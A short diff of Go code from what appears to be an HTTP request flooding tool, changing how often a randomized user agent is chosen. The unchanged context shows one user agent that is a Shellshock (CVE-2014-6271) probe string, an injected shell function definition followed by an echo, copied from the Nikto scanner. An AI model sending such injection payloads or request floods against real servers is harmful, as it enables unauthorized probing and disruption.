@@ -313,7 +313,7 @@ func (attack *Attack) send() {
 		var ua = ""
 		for r := 0; r < random(attack.minRequests, attack.maxRequests); r++ {
 			/* Get randomized user agent */
-			ret := random(0, 50)
+			ret := random(0, 1000)
 			
 			if ret == 1 {
 				ua = "() { :; }; echo Nikto-Added-CVE-2014-6271: true;echo;echo;"
